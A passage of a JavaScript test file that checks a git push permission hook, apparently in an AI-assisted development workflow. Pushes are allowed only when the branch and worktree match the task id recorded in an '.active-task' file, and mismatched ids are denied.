    git(dirNamed, 'remote', 'add', 'origin', join(base, 'opmain-origin.git'));
    writeFileSync(join(dirNamed, '.active-task'), 'AISDLC-9\n');
    const cwd = realpathSync(dirNamed);
    assert.ok(denied(run(push('ai-sdlc/aisdlc-9-x'), { cwd, projectDir: cwd })));
    void op;
    void mainDir;
  });
});

describe('gh-issue task ids', () => {
  it('allows gh-issue-N with dir .worktrees/gh-issue-N and branch ai-sdlc/gh-issue-N-slug', () => {
    const r = makeRepo('ghissue', roleYaml(LEASE));
    const B = 'ai-sdlc/gh-issue-42-fix-thing';
    const dir = join(r.root, '.worktrees', 'gh-issue-42');
    git(r.root, 'worktree', 'add', '-q', '-b', B, dir);
    writeFileSync(join(dir, '.active-task'), 'gh-issue-42\n');
    const cwd = realpathSync(dir);
    const cmd = `git push --force-with-lease origin HEAD:refs/heads/${B}`;
    assert.ok(!denied(run(cmd, { cwd, projectDir: r.root })));
    // mismatched id still denies
    writeFileSync(join(dir, '.active-task'), 'gh-issue-43\n');
    assert.ok(denied(run(cmd, { cwd, projectDir: r.root })));
  });
});
